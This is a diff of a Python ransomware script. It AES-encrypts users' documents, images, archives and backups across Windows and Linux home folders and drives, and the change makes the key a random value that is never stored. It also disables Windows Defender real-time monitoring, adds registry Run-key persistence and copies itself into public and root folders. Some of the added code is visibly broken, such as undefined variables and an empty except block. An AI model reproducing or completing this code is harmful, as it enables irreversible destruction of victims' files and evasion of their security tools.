@@ -7,12 +7,15 @@ try:
 	import shutil
 	from os import getenv,system
 	from Crypto.Cipher import AES
+	from Crypto import Random
 	import glob
 	import platform
 	from shutil import copyfile
-except:
+	import string
+except Exception as e:
 	print('An error ocurred.',e)
 	exit()
+
 def crypt(file):
 	file_crypto = open(file,'rb')
 	file_crypto = file_crypto.read()
@@ -23,8 +26,11 @@ def crypt(file):
 	cifile.close()
 	os.rename(file,file+'.rain')
 
-k='u7x!A%D*G-KaPdSgVkYp3s5v8y/B?E(H'
+BLOCK_SIZE = 32
+k = Random.new().read(BLOCK_SIZE)
 aes = AES.new(k, AES.MODE_ECB)
+drives = list(string.ascii_uppercase)
+file_name = os.path.basename(sys.argv[0])
 ext=['*.txt','*.lnk','*.application','*.veg','*.doc','*.pdf','*.jpg','*.gif','*.png','*.bitmap'
 ,'*.mp4','*.avi','*.zip','*.wav','*.svg','*.mdb','*.rar','*.tar','*.xf','*.gz'
 ,'*.sqlite3','*.mov','*.pptx','*.pptm','*.xlsx','*.xlsm','*.aes','*.accdb','*.bmp'
@@ -33,14 +39,38 @@ ext=['*.txt','*.lnk','*.application','*.veg','*.doc','*.pdf','*.jpg','*.gif','*.
 ,'*.bz2','*.iso','*.img','*.sfk','*.mkv','*.psd','*.xz','*.7z','*.gz','*.mid','*.wmv','*.mov'
 ,'*.cdr','*.ai','*.tif','*.fla','*.swf','*.dwg','*.mpg','*.xls','*.docx','*.rtf','*.pps','*.ppt'
 ,'*.pptx','*.ppsx','*.ico','*.3gp','*.dxf','*.eps','*.max','*.nrg','*.ogg','*.pic','*.php','*.qxd'
-,'*.rm','*.swf','*.vob','*.wri','*.vbs','*.chc','*.real','*.list','*.desktop','*.so','*.json','*.new']
-
+,'*.rm','*.swf','*.vob','*.wri','*.vbs','*.chc','*.real','*.list','*.desktop','*.so','*.json','*.new'
+,"*.bkp","*.bak","*.tmp","*.gho","*.mp3"]
 sys = platform.system()
+
+def infectall():
+	if sys=="Windows":
+		try:
+			i = i+":/"
+			os.chdir(i)
+			for e in ext:
+				try:
+					files = glob.iglob(i+"**/"+(ext),recursive=True)
+				except:
+					pass
+				for file in files:
+					try:
+						crypt(file)
+					except:
+						pass
+	elif sys=="Linux":
+		exit()
+
 if sys=='Windows':
 	try:
-		shutil.copy('sik.py','C:/Users/Public/')
+		bat3 = open('C:/Users/Public/wd.bat','w')
+		bat3.write('Set-MpPreference -DisableRealtimeMonitoring $ true')
+		bat3.close()
+		
+		os.startfile('C:/Users/Public/wd.bat')
+		shutil.copy(file_name,'C:/Users/Public/')
 		bat = open('C:/Users/Public/prst.bat','w')
-		bat.write('reg.exe add "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" /v "tskname" /t REG_SZ /d "C:\\Users\\Public\\sik.py" /f')
+		bat.write('reg.exe add "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" /v "tskname" /t REG_SZ /d "C:\\Users\\Public\\globancy.exe" /f')
 		bat.close()
 		os.startfile('C:/Users/Public/prst.bat')
 
@@ -49,19 +79,16 @@ if sys=='Windows':
 		bat2.close()
 		os.startfile('C:/Users/Public/uac.bat')
 
-
-		bat3 = open('C:/Users/Public/wd.bat','w')
-		bat3.write('Set-MpPreference -DisableRealtimeMonitoring $ true')
-		bat3.close()
-		os.startfile('C:/Users/Public/wd.bat')
-
 		desktop = os.path.expanduser('~/Desktop')
 		documents = os.path.expanduser('~/Documents')
 		downloads = os.path.expanduser('~/Downloads')
 		appdt = getenv('APPDATA')
 	except:
 		pass
-	os.chdir(desktop)
+	try:
+		os.chdir(desktop)
+	except:
+		pass
 	for i in ext:
 		try:
 			files = glob.iglob(desktop+'/**/'+(i),recursive=True)
@@ -72,8 +99,10 @@ if sys=='Windows':
 				crypt(file)
 			except:
 				pass
-
-	os.chdir(documents)
+	try:
+		os.chdir(documents)
+	except:
+		pass
 	for i in ext:
 		try:
 			files = glob.iglob(documents+'/**/'+(i),recursive=True)
@@ -84,8 +113,10 @@ if sys=='Windows':
 				crypt(file)
 			except:
 				pass
-
-	os.chdir(downloads)
+	try:
+		os.chdir(downloads)
+	except:
+		pass
 	for i in ext:
 		try:
 			files = glob.iglob(downloads+'/**/'+(i),recursive=True)
@@ -116,16 +147,7 @@ if sys=='Windows':
 	except:
 		pass
 
-	for i in ext:
-		try:
-			files = glob.iglob('C:/**/'+(i),recursive=True)
-		except:
-			pass
-		for file in files:
-			try:
-				crypt(file)
-			except:
-				pass
+	infectall()
 elif sys=='Linux':
 	desktop = os.path.expanduser('~/Desktop')
 	area = os.path.expanduser('~/Área de trabalho')
@@ -135,27 +157,29 @@ elif sys=='Linux':
 	root = os.path.expanduser('/')
 	
 	try:
-		shutil.copy('sik.py',documents)
-		shutil.copy('sik.py',documentos)
-		shutil.copy('sik.py',root)
+		shutil.copy(file_name,documents)
+		shutil.copy(file_name,documentos)
+		shutil.copy(file_name,root)
 	except:
 		pass
-
-	
 	try:
 		os.chdir(desktop)
 	except:
+		pass
+	try:
 		os.chdir(area)
-		for i in ext:
+	except:
+		pass
+	for i in ext:
+		try:
+			files = glob.iglob(area+'/**/'+(i),recursive=True)
+		except:
+			pass
+		for file in files:
 			try:
-				files = glob.iglob(area+'/**/'+(i),recursive=True)
+				crypt(file)
 			except:
 				pass
-			for file in files:
-				try:
-					crypt(file)
-				except:
-					pass
 	for i in ext:
 		try:
 			files = glob.iglob(desktop+'/**/'+(i),recursive=True)
@@ -169,17 +193,20 @@ elif sys=='Linux':
 	try:
 		os.chdir(documents)
 	except:
+	try:
 		os.chdir(documentos)
-		for i in ext:
+	except:
+		pass
+	for i in ext:
+		try:
+			files = glob.iglob(documentos+'/**/'+(i),recursive=True)
+		except:
+			pass
+		for file in files:
 			try:
-				files = glob.iglob(documentos+'/**/'+(i),recursive=True)
+				crypt(file)
 			except:
 				pass
-			for file in files:
-				try:
-					crypt(file)
-				except:
-					pass
 
 	for i in ext:
 			try:
@@ -191,8 +218,10 @@ elif sys=='Linux':
 					crypt(file)
 				except:
 					pass
-
-	os.chdir(downloads)
+	try:
+		os.chdir(downloads)
+	except:
+		pass
 	for i in ext:
 		try:
 			files = glob.iglob(downloads+'/**/'+(i),recursive=True)
@@ -203,16 +232,4 @@ elif sys=='Linux':
 				crypt(file)
 			except:
 				pass
-	os.chdir(root)
-	for i in ext:
-		try:
-			files = glob.iglob(root+'/**/'+(i),recursive=True)
-		except:
-			pass
-		for file in files:
-			try:
-				crypt(file)
-			except:
-				pass
-
-
+	infectall()
